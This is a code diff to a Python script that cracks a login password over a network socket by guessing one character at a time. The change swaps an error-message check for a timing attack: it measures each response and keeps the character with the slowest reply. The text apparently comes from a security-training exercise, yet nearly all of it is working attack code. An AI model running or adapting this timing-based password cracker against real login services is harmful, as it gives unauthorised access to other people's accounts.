@@ -3,6 +3,7 @@ import sys
 from itertools import product
 import json
 import string
+from time import perf_counter
 
 def main():
     if len(sys.argv) < 3:
@@ -41,21 +42,25 @@ def find_password(client_socket, login):
     password = ""
 
     while True:
+        timings = []
         for c in all_chars:
             json_dict = json.dumps({"login": login, "password": password + c})
+            start = perf_counter()
             client_socket.send(json_dict.encode())
             response = client_socket.recv(1024)
+            elapsed = perf_counter() - start
             response = response.decode()
             response = json.loads(response)
-            if response['result'] == "Exception happened during login":
-                password += c
-                break
-            elif response['result'] == "Connection success!":
+
+            if response['result'] == "Connection success!":
                 password += c
                 print(json_dict)
                 client_socket.close()
                 return
 
+            timings.append((elapsed, c))
+        best_tuple = max(timings, key=lambda x: x[0])
+        password += best_tuple[1]
 
 if __name__ == "__main__":
     main()
